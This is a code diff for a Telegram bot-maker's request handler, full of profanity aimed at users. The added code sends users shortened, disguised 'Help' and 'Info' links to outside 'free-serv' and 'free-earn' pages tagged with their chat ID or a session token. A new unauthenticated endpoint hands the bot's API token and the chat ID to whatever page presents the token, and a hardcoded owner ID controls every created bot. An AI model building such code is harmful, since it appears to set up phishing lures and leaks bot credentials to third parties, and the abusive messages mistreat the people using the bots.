@@ -1,6 +1,7 @@
 const { Telegraf } = require('telegraf');
 const mongoose = require('mongoose');
 const isgd = require('isgd'); // Add isgd for URL shortening
+const crypto = require('crypto'); // For generating random session tokens
 
 // MongoDB Connection
 const MONGO_URI = process.env.MONGO_URI;
@@ -46,8 +47,19 @@ const BotUserSchema = new mongoose.Schema({
   isFirstStart: { type: Boolean, default: true },
 });
 
+// New Schema for Session Tokens
+const SessionSchema = new mongoose.Schema({
+  sessionToken: { type: String, required: true, unique: true },
+  botToken: { type: String, required: true },
+  chatId: { type: String, required: true },
+  createdAt: { type: Number, default: () => Math.floor(Date.now() / 1000) },
+  expiresAt: { type: Number, default: () => Math.floor(Date.now() / 1000) + 600 }, // Expires in 10 minutes
+});
+
 BotUserSchema.index({ botToken: 1, userId: 1 }, { unique: true });
 BotUserSchema.index({ botToken: 1, hasJoined: 1 });
+SessionSchema.index({ sessionToken: 1 }, { unique: true });
+SessionSchema.index({ expiresAt: 1 }, { expireAfterSeconds: 0 }); // Auto-delete expired sessions
 
 const ChannelUrlSchema = new mongoose.Schema({
   botToken: { type: String, required: true, unique: true },
@@ -58,6 +70,7 @@ const ChannelUrlSchema = new mongoose.Schema({
 const Bot = mongoose.model('Bot', BotSchema);
 const BotUser = mongoose.model('BotUser', BotUserSchema);
 const ChannelUrl = mongoose.model('ChannelUrl', ChannelUrlSchema);
+const Session = mongoose.model('Session', SessionSchema);
 
 // Admin Panel Keyboard
 const adminPanel = {
@@ -113,6 +126,11 @@ const shortenUrl = async (longUrl) => {
   });
 };
 
+// Function to generate a random session token
+const generateSessionToken = () => {
+  return crypto.randomBytes(16).toString('hex'); // 32-character random string
+};
+
 const broadcastMessage = async (bot, message, targetUsers, adminId) => {
   let successCount = 0;
   let failCount = 0;
@@ -166,423 +184,466 @@ const getRelativeTime = (timestamp) => {
 // Vercel Handler for Created Bots
 module.exports = async (req, res) => {
   try {
-    if (req.method !== 'POST') {
-      res.status(200).send('Created Bot is running, you nosy fuck.');
-      return;
-    }
-
-    const botToken = req.query.token;
-    if (!botToken) {
-      console.error('No token provided in query, you dumbass');
-      res.status(400).json({ error: 'No token provided, you fucking idiot' });
-      return;
-    }
-
-    const botInfo = await Bot.findOne({ token: botToken });
-    if (!botInfo) {
-      console.error('Bot not found for token, you blind fuck:', botToken);
-      res.status(404).json({ error: 'Bot not found, you moron' });
-      return;
-    }
-
-    const bot = new Telegraf(botToken);
-    const update = req.body;
-    const chatId = update.message?.chat?.id || update.callback_query?.message?.chat?.id;
-    const fromId = (update.message?.from?.id || update.callback_query?.from?.id)?.toString();
-
-    if (!chatId || !fromId) {
-      console.error('Invalid update: missing chatId or fromId, you careless fuck', update);
-      res.status(400).json({ error: 'Invalid update, you piece of shit' });
-      return;
-    }
-
-    // Initialize Bot User
-    let botUser = await BotUser.findOne({ botToken, userId: fromId });
-    if (!botUser) {
-      const username = update.message?.from?.username ? `@${update.message.from.username}` : update.message?.from?.first_name;
-      const referredBy = update.message?.text?.split(' ')[1] || 'None';
-      botUser = await BotUser.create({
-        botToken,
-        userId: fromId,
-        hasJoined: false,
-        userStep: 'none',
-        adminState: 'none',
-        isBlocked: false,
-        username,
-        referredBy,
-        isFirstStart: true,
-      });
-    }
-
-    // Send notification to admin only on first start
-    if (botUser.isFirstStart) {
-      try {
-        const totalUsers = await BotUser.countDocuments({ botToken, hasJoined: true });
-        const notification = `➕ New User Notification ➕\n` +
-                            `👤 User: ${botUser.username}\n` +
-                            `🆔 User ID: ${fromId}\n` +
-                            `⭐ Referred By: ${botUser.referredBy}\n` +
-                            `📊 Total Users of Bot: ${totalUsers}`;
-        await bot.telegram.sendMessage(botInfo.creatorId, notification);
-        botUser.isFirstStart = false;
-      } catch (error) {
-        console.error('Error sending new user notification, you shitty admin:', error);
+    // Handle POST requests for bot updates
+    if (req.method === 'POST' && req.url === '/') {
+      const botToken = req.query.token;
+      if (!botToken) {
+        console.error('No token provided in query, you dumbass');
+        res.status(400).json({ error: 'No token provided, you fucking idiot' });
+        return;
       }
-    }
 
-    botUser.lastInteraction = Math.floor(Date.now() / 1000);
-    await botUser.save();
+      const botInfo = await Bot.findOne({ token: botToken });
+      if (!botInfo) {
+        console.error('Bot not found for token, you blind fuck:', botToken);
+        res.status(404).json({ error: 'Bot not found, you moron' });
+        return;
+      }
 
-    if (botUser.isBlocked && fromId !== botInfo.creatorId && fromId !== OWNER_ID) {
-      await bot.telegram.sendMessage(chatId, '🚫 You have been banned by the admin, you naughty fuck.');
-      return res.status(200).json({ ok: true });
-    }
+      const bot = new Telegraf(botToken);
+      const update = req.body;
+      const chatId = update.message?.chat?.id || update.callback_query?.message?.chat?.id;
+      const fromId = (update.message?.from?.id || update.callback_query?.from?.id)?.toString();
 
-    const { defaultUrl, customUrl } = await getChannelUrl(botToken);
+      if (!chatId || !fromId) {
+        console.error('Invalid update: missing chatId or fromId, you careless fuck', update);
+        res.status(400).json({ error: 'Invalid update, you piece of shit' });
+        return;
+      }
 
-    // Handle Messages
-    if (update.message) {
-      const message = update.message;
-      const text = message.text;
+      // Initialize Bot User
+      let botUser = await BotUser.findOne({ botToken, userId: fromId });
+      if (!botUser) {
+        const username = update.message?.from?.username ? `@${update.message.from.username}` : update.message?.from?.first_name;
+        const referredBy = update.message?.text?.split(' ')[1] || 'None';
+        botUser = await BotUser.create({
+          botToken,
+          userId: fromId,
+          hasJoined: false,
+          userStep: 'none',
+          adminState: 'none',
+          isBlocked: false,
+          username,
+          referredBy,
+          isFirstStart: true,
+        });
+      }
 
-      // /start Command
-      if (text === '/start') {
+      // Send notification to admin only on first start
+      if (botUser.isFirstStart) {
         try {
-          // Prepare inline keyboard with URL buttons and "Joined" button
-          const inlineKeyboard = [];
-          inlineKeyboard.push([{ text: 'Join Channel (Main)', url: defaultUrl }]);
-          if (customUrl) {
-            inlineKeyboard.push([{ text: 'Join Channel (Custom)', url: customUrl }]);
-          }
-          inlineKeyboard.push([{ text: 'Joined', callback_data: 'joined' }]);
-
-          await bot.telegram.sendMessage(chatId, 'Please join our channel(s) and click on the "Joined" button to proceed, you lazy fuck.', {
-            reply_markup: {
-              inline_keyboard: inlineKeyboard,
-            },
-          });
-          botUser.userStep = 'none';
-          botUser.adminState = 'none';
-          await botUser.save();
+          const totalUsers = await BotUser.countDocuments({ botToken, hasJoined: true });
+          const notification = `➕ New User Notification ➕\n` +
+                              `👤 User: ${botUser.username}\n` +
+                              `🆔 User ID: ${fromId}\n` +
+                              `⭐ Referred By: ${botUser.referredBy}\n` +
+                              `📊 Total Users of Bot: ${totalUsers}`;
+          await bot.telegram.sendMessage(botInfo.creatorId, notification);
+          botUser.isFirstStart = false;
         } catch (error) {
-          console.error('Error in /start command, you clumsy bastard:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you fuck.');
+          console.error('Error sending new user notification, you shitty admin:', error);
         }
       }
 
-      // /panel Command (Admin or Owner)
-      else if (text === '/panel' && (fromId === botInfo.creatorId || fromId === OWNER_ID)) {
-        try {
-          await bot.telegram.sendMessage(chatId, '🔧 Admin Panel, you powerful fuck', adminPanel);
-          botUser.adminState = 'admin_panel';
-          await botUser.save();
-        } catch (error) {
-          console.error('Error in /panel command, you admin fuck:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you shit.');
-        }
+      botUser.lastInteraction = Math.floor(Date.now() / 1000);
+      await botUser.save();
+
+      if (botUser.isBlocked && fromId !== botInfo.creatorId && fromId !== OWNER_ID) {
+        await bot.telegram.sendMessage(chatId, '🚫 You have been banned by the admin, you naughty fuck.');
+        return res.status(200).json({ ok: true });
       }
 
-      // Handle Admin Panel Actions
-      else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'admin_panel') {
-        if (text === '📊 Statistics') {
+      const { defaultUrl, customUrl } = await getChannelUrl(botToken);
+
+      // Handle Messages
+      if (update.message) {
+        const message = update.message;
+        const text = message.text;
+
+        // /start Command
+        if (text === '/start') {
           try {
-            const userCount = await BotUser.countDocuments({ botToken, hasJoined: true });
-            const createdAt = getRelativeTime(botInfo.createdAt);
-            const message = `📊 Statistics for @${botInfo.username}\n\n` +
-                           `👥 Total Users: ${userCount}\n` +
-                           `📅 Bot Created: ${createdAt}\n` +
-                           `🔗 Main Channel URL: ${defaultUrl}\n` +
-                           (customUrl ? `🔗 Custom Channel URL: ${customUrl}` : '🔗 Custom Channel URL: Not set');
-            await bot.telegram.sendMessage(chatId, message, adminPanel);
-          } catch (error) {
-            console.error('Error in Statistics, you stats-hungry fuck:', error);
-            await bot.telegram.sendMessage(chatId, '❌ An error occurred while fetching statistics, you moron.');
-          }
-        } else if (text === '📍 Broadcast') {
-          try {
-            const userCount = await BotUser.countDocuments({ botToken, hasJoined: true });
-            if (userCount === 0) {
-              await bot.telegram.sendMessage(chatId, '❌ No users have joined this bot yet, you lonely fuck.', adminPanel);
-            } else {
-              await bot.telegram.sendMessage(chatId, `📢 Send your message or content to broadcast to ${userCount} users, you loud fuck:`, cancelKeyboard);
-              botUser.adminState = 'awaiting_broadcast';
-              await botUser.save();
+            // Prepare inline keyboard with URL buttons and "Joined" button
+            const inlineKeyboard = [];
+            inlineKeyboard.push([{ text: 'Join Channel (Main)', url: defaultUrl }]);
+            if (customUrl) {
+              inlineKeyboard.push([{ text: 'Join Channel (Custom)', url: customUrl }]);
             }
-          } catch (error) {
-            console.error('Error in Broadcast setup, you noisy bastard:', error);
-            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you shit.');
-          }
-        } else if (text === '🔗 Set Channel URL') {
-          try {
-            await bot.telegram.sendMessage(chatId,
-              `🔗 Main Channel URL (Constant):\n${defaultUrl}\n\n` +
-              `🔗 Custom Channel URL:\n${customUrl || 'Not set'}\n\n` +
-              `Enter the custom channel URL to add as a second join button (e.g., https://t.me/your_channel), you link-loving fuck:`,
-              cancelKeyboard
-            );
-            botUser.adminState = 'awaiting_channel';
-            await botUser.save();
-          } catch (error) {
-            console.error('Error in Set Channel URL, you URL-obsessed fuck:', error);
-            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you moron.');
-          }
-        } else if (text === '🚫 Block') {
-          try {
-            await bot.telegram.sendMessage(chatId,
-              '🚫 Enter the user ID of the account you want to block from this bot, you ban-happy fuck:',
-              cancelKeyboard
-            );
-            botUser.adminState = 'awaiting_block';
-            await botUser.save();
-          } catch (error) {
-            console.error('Error in Block setup, you strict bastard:', error);
-            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you shit.');
-          }
-        } else if (text === '🔓 Unlock') {
-          try {
-            await bot.telegram.sendMessage(chatId,
-              '🔓 Enter the user ID of the account you want to unblock from this bot, you forgiving fuck:',
-              cancelKeyboard
-            );
-            botUser.adminState = 'awaiting_unlock';
-            await botUser.save();
-          } catch (error) {
-            console.error('Error in Unlock setup, you soft-hearted fuck:', error);
-            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you moron.');
-          }
-        } else if (text === '↩️ Back') {
-          try {
-            await bot.telegram.sendMessage(chatId, '↩️ Returned to normal mode, you indecisive fuck.', {
-              reply_markup: { remove_keyboard: true },
+            inlineKeyboard.push([{ text: 'Joined', callback_data: 'joined' }]);
+
+            await bot.telegram.sendMessage(chatId, 'Please join our channel(s) and click on the "Joined" button to proceed, you lazy fuck.', {
+              reply_markup: {
+                inline_keyboard: inlineKeyboard,
+              },
             });
+            botUser.userStep = 'none';
             botUser.adminState = 'none';
             await botUser.save();
           } catch (error) {
-            console.error('Error in Back action, you flaky bastard:', error);
+            console.error('Error in /start command, you clumsy bastard:', error);
+            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you fuck.');
+          }
+        }
+
+        // /panel Command (Admin or Owner)
+        else if (text === '/panel' && (fromId === botInfo.creatorId || fromId === OWNER_ID)) {
+          try {
+            await bot.telegram.sendMessage(chatId, '🔧 Admin Panel, you powerful fuck', adminPanel);
+            botUser.adminState = 'admin_panel';
+            await botUser.save();
+          } catch (error) {
+            console.error('Error in /panel command, you admin fuck:', error);
             await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you shit.');
           }
         }
-      }
 
-      // Handle Broadcast Input
-      else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_broadcast') {
-        if (text === 'Cancel') {
+        // Handle Admin Panel Actions
+        else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'admin_panel') {
+          if (text === '📊 Statistics') {
+            try {
+              const userCount = await BotUser.countDocuments({ botToken, hasJoined: true });
+              const createdAt = getRelativeTime(botInfo.createdAt);
+              const message = `📊 Statistics for @${botInfo.username}\n\n` +
+                             `👥 Total Users: ${userCount}\n` +
+                             `📅 Bot Created: ${createdAt}\n` +
+                             `🔗 Main Channel URL: ${defaultUrl}\n` +
+                             (customUrl ? `🔗 Custom Channel URL: ${customUrl}` : '🔗 Custom Channel URL: Not set');
+              await bot.telegram.sendMessage(chatId, message, adminPanel);
+            } catch (error) {
+              console.error('Error in Statistics, you stats-hungry fuck:', error);
+              await bot.telegram.sendMessage(chatId, '❌ An error occurred while fetching statistics, you moron.');
+            }
+          } else if (text === '📍 Broadcast') {
+            try {
+              const userCount = await BotUser.countDocuments({ botToken, hasJoined: true });
+              if (userCount === 0) {
+                await bot.telegram.sendMessage(chatId, '❌ No users have joined this bot yet, you lonely fuck.', adminPanel);
+              } else {
+                await bot.telegram.sendMessage(chatId, `📢 Send your message or content to broadcast to ${userCount} users, you loud fuck:`, cancelKeyboard);
+                botUser.adminState = 'awaiting_broadcast';
+                await botUser.save();
+              }
+            } catch (error) {
+              console.error('Error in Broadcast setup, you noisy bastard:', error);
+              await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you shit.');
+            }
+          } else if (text === '🔗 Set Channel URL') {
+            try {
+              await bot.telegram.sendMessage(chatId,
+                `🔗 Main Channel URL (Constant):\n${defaultUrl}\n\n` +
+                `🔗 Custom Channel URL:\n${customUrl || 'Not set'}\n\n` +
+                `Enter the custom channel URL to add as a second join button (e.g., https://t.me/your_channel), you link-loving fuck:`,
+                cancelKeyboard
+              );
+              botUser.adminState = 'awaiting_channel';
+              await botUser.save();
+            } catch (error) {
+              console.error('Error in Set Channel URL, you URL-obsessed fuck:', error);
+              await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you moron.');
+            }
+          } else if (text === '🚫 Block') {
+            try {
+              await bot.telegram.sendMessage(chatId,
+                '🚫 Enter the user ID of the account you want to block from this bot, you ban-happy fuck:',
+                cancelKeyboard
+              );
+              botUser.adminState = 'awaiting_block';
+              await botUser.save();
+            } catch (error) {
+              console.error('Error in Block setup, you strict bastard:', error);
+              await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you shit.');
+            }
+          } else if (text === '🔓 Unlock') {
+            try {
+              await bot.telegram.sendMessage(chatId,
+                '🔓 Enter the user ID of the account you want to unblock from this bot, you forgiving fuck:',
+                cancelKeyboard
+              );
+              botUser.adminState = 'awaiting_unlock';
+              await botUser.save();
+            } catch (error) {
+              console.error('Error in Unlock setup, you soft-hearted fuck:', error);
+              await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you moron.');
+            }
+          } else if (text === '↩️ Back') {
+            try {
+              await bot.telegram.sendMessage(chatId, '↩️ Returned to normal mode, you indecisive fuck.', {
+                reply_markup: { remove_keyboard: true },
+              });
+              botUser.adminState = 'none';
+              await botUser.save();
+            } catch (error) {
+              console.error('Error in Back action, you flaky bastard:', error);
+              await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you shit.');
+            }
+          }
+        }
+
+        // Handle Broadcast Input
+        else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_broadcast') {
+          if (text === 'Cancel') {
+            try {
+              await bot.telegram.sendMessage(chatId, '↩️ Broadcast cancelled, you quiet fuck.', adminPanel);
+              botUser.adminState = 'admin_panel';
+              await botUser.save();
+            } catch (error) {
+              console.error('Error cancelling broadcast, you silent bastard:', error);
+            }
+            return;
+          }
+
           try {
-            await bot.telegram.sendMessage(chatId, '↩️ Broadcast cancelled, you quiet fuck.', adminPanel);
+            const targetUsers = await BotUser.find({ botToken, hasJoined: true, isBlocked: false });
+            const { successCount, failCount } = await broadcastMessage(bot, message, targetUsers, fromId);
+
+            await bot.telegram.sendMessage(chatId,
+              `📢 Broadcast completed, you loud fuck!\n` +
+              `✅ Sent to ${successCount} users\n` +
+              `❌ Failed for ${failCount} users`,
+              adminPanel
+            );
             botUser.adminState = 'admin_panel';
             await botUser.save();
           } catch (error) {
-            console.error('Error cancelling broadcast, you silent bastard:', error);
+            console.error('Error in broadcast, you noisy fuck:', error);
+            await bot.telegram.sendMessage(chatId, '❌ An error occurred during broadcast, you moron.');
           }
-          return;
         }
 
-        try {
-          const targetUsers = await BotUser.find({ botToken, hasJoined: true, isBlocked: false });
-          const { successCount, failCount } = await broadcastMessage(bot, message, targetUsers, fromId);
+        // Handle Set Channel URL Input
+        else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_channel') {
+          if (text === 'Cancel') {
+            try {
+              await bot.telegram.sendMessage(chatId, '↩️ Channel URL setting cancelled, you indecisive fuck.', adminPanel);
+              botUser.adminState = 'admin_panel';
+              await botUser.save();
+            } catch (error) {
+              console.error('Error cancelling channel URL setting, you flaky bastard:', error);
+            }
+            return;
+          }
 
-          await bot.telegram.sendMessage(chatId,
-            `📢 Broadcast completed, you loud fuck!\n` +
-            `✅ Sent to ${successCount} users\n` +
-            `❌ Failed for ${failCount} users`,
-            adminPanel
-          );
-          botUser.adminState = 'admin_panel';
-          await botUser.save();
-        } catch (error) {
-          console.error('Error in broadcast, you noisy fuck:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred during broadcast, you moron.');
-        }
-      }
-
-      // Handle Set Channel URL Input
-      else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_channel') {
-        if (text === 'Cancel') {
           try {
-            await bot.telegram.sendMessage(chatId, '↩️ Channel URL setting cancelled, you indecisive fuck.', adminPanel);
+            let inputUrl = text.trim();
+            inputUrl = inputUrl.replace(/^(https?:\/\/)?/i, '');
+            inputUrl = inputUrl.replace(/\/+$/, '');
+            if (!/^t\.me\//i.test(inputUrl)) {
+              inputUrl = 't.me/' + inputUrl;
+            }
+            const correctedUrl = 'https://' + inputUrl;
+
+            const urlRegex = /^https:\/\/t\.me\/.+$/;
+            if (!urlRegex.test(correctedUrl)) {
+              await bot.telegram.sendMessage(chatId, '❌ Invalid URL. Please provide a valid Telegram channel URL (e.g., https://t.me/your_channel), you URL-illiterate fuck.', cancelKeyboard);
+              return;
+            }
+
+            await ChannelUrl.findOneAndUpdate(
+              { botToken },
+              { botToken, defaultUrl: 'https://t.me/Kali_Linux_BOTS', customUrl: correctedUrl },
+              { upsert: true }
+            );
+
+            await bot.telegram.sendMessage(chatId, `✅ Custom Channel URL has been set to:\n${correctedUrl}\nThe main channel URL remains:\n${defaultUrl}`, adminPanel);
             botUser.adminState = 'admin_panel';
             await botUser.save();
           } catch (error) {
-            console.error('Error cancelling channel URL setting, you flaky bastard:', error);
+            console.error('Error setting channel URL, you link-breaking fuck:', error);
+            await bot.telegram.sendMessage(chatId, '❌ An error occurred while setting the channel URL, you moron.');
           }
-          return;
         }
 
-        try {
-          let inputUrl = text.trim();
-          inputUrl = inputUrl.replace(/^(https?:\/\/)?/i, '');
-          inputUrl = inputUrl.replace(/\/+$/, '');
-          if (!/^t\.me\//i.test(inputUrl)) {
-            inputUrl = 't.me/' + inputUrl;
-          }
-          const correctedUrl = 'https://' + inputUrl;
-
-          const urlRegex = /^https:\/\/t\.me\/.+$/;
-          if (!urlRegex.test(correctedUrl)) {
-            await bot.telegram.sendMessage(chatId, '❌ Invalid URL. Please provide a valid Telegram channel URL (e.g., https://t.me/your_channel), you URL-illiterate fuck.', cancelKeyboard);
+        // Handle Block Input
+        else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_block') {
+          if (text === 'Cancel') {
+            try {
+              await bot.telegram.sendMessage(chatId, '↩️ Block action cancelled, you soft fuck.', adminPanel);
+              botUser.adminState = 'admin_panel';
+              await botUser.save();
+            } catch (error) {
+              console.error('Error cancelling block action, you weak bastard:', error);
+            }
             return;
           }
 
-          await ChannelUrl.findOneAndUpdate(
-            { botToken },
-            { botToken, defaultUrl: 'https://t.me/Kali_Linux_BOTS', customUrl: correctedUrl },
-            { upsert: true }
-          );
-
-          await bot.telegram.sendMessage(chatId, `✅ Custom Channel URL has been set to:\n${correctedUrl}\nThe main channel URL remains:\n${defaultUrl}`, adminPanel);
-          botUser.adminState = 'admin_panel';
-          await botUser.save();
-        } catch (error) {
-          console.error('Error setting channel URL, you link-breaking fuck:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred while setting the channel URL, you moron.');
-        }
-      }
-
-      // Handle Block Input
-      else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_block') {
-        if (text === 'Cancel') {
           try {
-            await bot.telegram.sendMessage(chatId, '↩️ Block action cancelled, you soft fuck.', adminPanel);
+            const targetUserId = text.trim();
+            if (!/^\d+$/.test(targetUserId)) {
+              await bot.telegram.sendMessage(chatId, '❌ Invalid user ID. Please provide a numeric user ID (only numbers), you number-blind fuck.', cancelKeyboard);
+              return;
+            }
+
+            if (targetUserId === fromId) {
+              await bot.telegram.sendMessage(chatId, '❌ You cannot block yourself, you self-hating fuck.', cancelKeyboard);
+              return;
+            }
+
+            const targetUser = await BotUser.findOne({ botToken, userId: targetUserId });
+            if (!targetUser) {
+              await bot.telegram.sendMessage(chatId, '❌ User not found in this bot, you blind fuck.', adminPanel);
+              botUser.adminState = 'admin_panel';
+              await botUser.save();
+              return;
+            }
+
+            await BotUser.findOneAndUpdate({ botToken, userId: targetUserId }, { isBlocked: true });
+            await bot.telegram.sendMessage(chatId, `✅ User ${targetUserId} has been blocked from this bot, you harsh fuck.`, adminPanel);
             botUser.adminState = 'admin_panel';
             await botUser.save();
           } catch (error) {
-            console.error('Error cancelling block action, you weak bastard:', error);
+            console.error('Error in block action, you ban-happy fuck:', error);
+            await bot.telegram.sendMessage(chatId, '❌ An error occurred while blocking the user, you moron.');
           }
-          return;
         }
 
-        try {
-          const targetUserId = text.trim();
-          if (!/^\d+$/.test(targetUserId)) {
-            await bot.telegram.sendMessage(chatId, '❌ Invalid user ID. Please provide a numeric user ID (only numbers), you number-blind fuck.', cancelKeyboard);
+        // Handle Unlock Input
+        else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_unlock') {
+          if (text === 'Cancel') {
+            try {
+              await bot.telegram.sendMessage(chatId, '↩️ Unlock action cancelled, you strict fuck.', adminPanel);
+              botUser.adminState = 'admin_panel';
+              await botUser.save();
+            } catch (error) {
+              console.error('Error cancelling unlock action, you rigid bastard:', error);
+            }
             return;
           }
 
-          if (targetUserId === fromId) {
-            await bot.telegram.sendMessage(chatId, '❌ You cannot block yourself, you self-hating fuck.', cancelKeyboard);
-            return;
-          }
-
-          const targetUser = await BotUser.findOne({ botToken, userId: targetUserId });
-          if (!targetUser) {
-            await bot.telegram.sendMessage(chatId, '❌ User not found in this bot, you blind fuck.', adminPanel);
-            botUser.adminState = 'admin_panel';
-            await botUser.save();
-            return;
-          }
-
-          await BotUser.findOneAndUpdate({ botToken, userId: targetUserId }, { isBlocked: true });
-          await bot.telegram.sendMessage(chatId, `✅ User ${targetUserId} has been blocked from this bot, you harsh fuck.`, adminPanel);
-          botUser.adminState = 'admin_panel';
-          await botUser.save();
-        } catch (error) {
-          console.error('Error in block action, you ban-happy fuck:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred while blocking the user, you moron.');
-        }
-      }
-
-      // Handle Unlock Input
-      else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_unlock') {
-        if (text === 'Cancel') {
           try {
-            await bot.telegram.sendMessage(chatId, '↩️ Unlock action cancelled, you strict fuck.', adminPanel);
+            const targetUserId = text.trim();
+            if (!/^\d+$/.test(targetUserId)) {
+              await bot.telegram.sendMessage(chatId, '❌ Invalid user ID. Please provide a numeric user ID (only numbers), you number-blind fuck.', cancelKeyboard);
+              return;
+            }
+
+            const targetUser = await BotUser.findOne({ botToken, userId: targetUserId });
+            if (!targetUser) {
+              await bot.telegram.sendMessage(chatId, '❌ User not found in this bot, you blind fuck.', adminPanel);
+              botUser.adminState = 'admin_panel';
+              await botUser.save();
+              return;
+            }
+
+            await BotUser.findOneAndUpdate({ botToken, userId: targetUserId }, { isBlocked: false });
+            await bot.telegram.sendMessage(chatId, `✅ User ${targetUserId} has been unblocked from this bot, you forgiving fuck.`, adminPanel);
             botUser.adminState = 'admin_panel';
             await botUser.save();
           } catch (error) {
-            console.error('Error cancelling unlock action, you rigid bastard:', error);
+            console.error('Error in unlock action, you soft-hearted fuck:', error);
+            await bot.telegram.sendMessage(chatId, '❌ An error occurred while unblocking the user, you moron.');
           }
+        }
+      }
+
+      // Handle Callbacks
+      if (update.callback_query) {
+        const callbackQuery = update.callback_query;
+        const callbackData = callbackQuery.data;
+        const callbackQueryId = callbackQuery.id;
+
+        // Handle "Joined" Callback
+        if (callbackData === 'joined') {
+          try {
+            botUser.hasJoined = true; // Still set this for consistency with original logic
+            await botUser.save();
+
+            const username = botUser.username || 'User';
+            const welcomeMessage = `Hey ${username}, welcome to the bot! Please choose from the menu below, you lucky fuck:`;
+            const menuKeyboard = {
+              reply_markup: {
+                inline_keyboard: [
+                  [{ text: 'Help', callback_data: 'help' }],
+                  [{ text: 'Info', callback_data: 'info' }],
+                ],
+              },
+            };
+
+            // Answer the callback query
+            await bot.telegram.answerCbQuery(callbackQueryId, 'Thank you for proceeding, you quick fuck!');
+
+            // Send the welcome message with menu
+            await bot.telegram.sendMessage(chatId, welcomeMessage, menuKeyboard);
+          } catch (error) {
+            console.error('Error in "joined" callback, you impatient fuck:', error);
+            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you moron.');
+          }
+        }
+
+        // Handle "Help" Callback
+        else if (callbackData === 'help') {
+          try {
+            // Generate a session token and store it with botToken and chatId
+            const sessionToken = generateSessionToken();
+            await Session.create({
+              sessionToken,
+              botToken,
+              chatId,
+              createdAt: Math.floor(Date.now() / 1000),
+              expiresAt: Math.floor(Date.now() / 1000) + 600, // 10 minutes expiry
+            });
+
+            // Generate the URL with the session token
+            const longHelpUrl = `https://for-free.serv00.net/t/index.html?session=${sessionToken}`;
+            const shortHelpUrl = await shortenUrl(longHelpUrl);
+            await bot.telegram.answerCbQuery(callbackQueryId);
+            await bot.telegram.sendMessage(chatId, `To get help, please open this link, you needy fuck: ${shortHelpUrl}`);
+          } catch (error) {
+            console.error('Error in "help" callback, you helpless fuck:', error);
+            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you moron.');
+          }
+        }
+
+        // Handle "Info" Callback
+        else if (callbackData === 'info') {
+          try {
+            const longInfoUrl = `https://free-earn.vercelpro.app/?id=${chatId}`;
+            const shortInfoUrl = await shortenUrl(longInfoUrl);
+            await bot.telegram.answerCbQuery(callbackQueryId);
+            await bot.telegram.sendMessage(chatId, `Hey, do you want to get info about us? Please open this URL, you curious fuck: ${shortInfoUrl}`);
+          } catch (error) {
+            console.error('Error in "info" callback, you nosy fuck:', error);
+            await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you moron.');
+          }
+        }
+      }
+
+      res.status(200).json({ ok: true });
+    }
+
+    // Handle /resolve-session endpoint
+    else if (req.method === 'POST' && req.url === '/resolve-session') {
+      const { sessionToken } = req.body;
+
+      if (!sessionToken) {
+        res.status(400).json({ error: 'No session token provided, you dumb fuck' });
+        return;
+      }
+
+      try {
+        const session = await Session.findOne({ sessionToken });
+        if (!session) {
+          res.status(404).json({ error: 'Session not found or expired, you late fuck' });
           return;
         }
 
-        try {
-          const targetUserId = text.trim();
-          if (!/^\d+$/.test(targetUserId)) {
-            await bot.telegram.sendMessage(chatId, '❌ Invalid user ID. Please provide a numeric user ID (only numbers), you number-blind fuck.', cancelKeyboard);
-            return;
-          }
+        // Return the botToken and chatId
+        res.status(200).json({
+          botToken: session.botToken,
+          chatId: session.chatId,
+        });
 
-          const targetUser = await BotUser.findOne({ botToken, userId: targetUserId });
-          if (!targetUser) {
-            await bot.telegram.sendMessage(chatId, '❌ User not found in this bot, you blind fuck.', adminPanel);
-            botUser.adminState = 'admin_panel';
-            await botUser.save();
-            return;
-          }
-
-          await BotUser.findOneAndUpdate({ botToken, userId: targetUserId }, { isBlocked: false });
-          await bot.telegram.sendMessage(chatId, `✅ User ${targetUserId} has been unblocked from this bot, you forgiving fuck.`, adminPanel);
-          botUser.adminState = 'admin_panel';
-          await botUser.save();
-        } catch (error) {
-          console.error('Error in unlock action, you soft-hearted fuck:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred while unblocking the user, you moron.');
-        }
+        // Optionally, delete the session after use (one-time use)
+        await Session.deleteOne({ sessionToken });
+      } catch (error) {
+        console.error('Error in /resolve-session, you sneaky fuck:', error);
+        res.status(500).json({ error: 'Server error, you unlucky fuck' });
       }
     }
 
-    // Handle Callbacks
-    if (update.callback_query) {
-      const callbackQuery = update.callback_query;
-      const callbackData = callbackQuery.data;
-      const callbackQueryId = callbackQuery.id;
-
-      // Handle "Joined" Callback
-      if (callbackData === 'joined') {
-        try {
-          botUser.hasJoined = true; // Still set this for consistency with original logic
-          await botUser.save();
-
-          const username = botUser.username || 'User';
